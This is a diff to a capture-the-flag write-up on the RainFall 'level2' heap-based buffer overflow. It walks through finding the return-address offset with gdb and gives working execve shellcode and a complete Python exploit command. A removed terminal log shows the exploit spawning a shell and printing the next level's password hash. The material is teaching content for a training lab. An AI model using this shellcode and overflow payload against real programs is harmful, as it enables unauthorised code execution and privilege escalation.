@@ -1,5 +1,5 @@
 📘 Buffer Overflow Exploit: Level 2
-This level is a classic heap-based buffer overflow challenge — unlike Level 1, the program prevents us from returning to addresses on the stack. Instead, we need to leverage the heap for our shellcode execution.
+This level is a classic heap-based buffer overflow challenge — unlike Level 1, the program prevents us from returning to addresses on the stack. Instead, we need to use the heap for our shellcode execution.
 
 ⚠️ Vulnerability Summary
 The program uses the unsafe gets() function, which does not check input size.
@@ -12,12 +12,9 @@ This means the shellcode can be stored in the heap, and the return address overw
 
 🧠 Our Goal
 We want to:
-
-Write shellcode as input (stored in the heap by strdup()).
-
-Overwrite the saved return address on the stack to point to the heap address returned by malloc.
-
-When the function returns, it jumps to our shellcode in the heap, giving us a shell.
+1.Write shellcode as input (stored in the heap by strdup()).
+2.Overwrite the saved return address on the stack to point to the heap address returned by malloc.
+3.When the function returns, it jumps to our shellcode in the heap, giving us a shell.
 
 🔎 Understanding the Program Behavior
 Using ltrace, the heap address returned by strdup() is always 0x0804a008.
@@ -29,16 +26,14 @@ We want the return address to be 0x0804a008 so it jumps to our shellcode in the 
 🛠 Finding the Offset to EIP (Return Address)
 Using gdb and a pattern of known characters:
 
-bash
-Copier
-Modifier
+```
 level2@RainFall:~$ gdb level2
 (gdb) run
 Starting program: ./level2
-Aa0Aa1Aa2Aa3...Ad2A
-
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
+"6A7c"
 (gdb) info register eip
 eip            0x37634136       0x37634136
 The pattern shows the return address is overwritten starting at offset 80 bytes.
@@ -54,15 +49,12 @@ Padding ("A")	59	Filler bytes to reach the return address
 Return Address	4	Overwrite with 0x0804a008 (heap shellcode addr)
 
 Shellcode (21 bytes):
-
-Copier
-Modifier
 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
-🔥 Final Exploit Command
-bash
-Copier
-Modifier
-python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
+\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+https://shell-storm.org/shellcode/files/shellcode-752.html
+
+Final Exploit Command
+python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
 
 cat /tmp/exploit - | ./level2
 ✅ What Happens?
@@ -95,27 +87,3 @@ We used the heap allocation from strdup() to store shellcode.
 We overwrote the return address with the heap address to gain control.
 
 Successfully escalated to level3.
-
-
-
-This checks if a value (probably a return address) is in memory region 0xb0000000. Why?
-
-0xb0000000 is often where heap or mmap memory lives (like strdup() or injected shellcode).
-
-So this is like: “only run this code if the return address or a pointer is in a valid shellcode region.”
-
-
-https://www.exploit-db.com/shellcodes/49768
-
-level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
-level2@RainFall:~$ /tmp/exploit | ./level2 
-level2@RainFall:~$ cat /tmp/exploit | ./level2 
-j
- X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
-level2@RainFall:~$ cat /tmp/exploit - | ./level2 
-j
- X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
-whoami
-level3
-cat /home/user/level3/.pass      
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
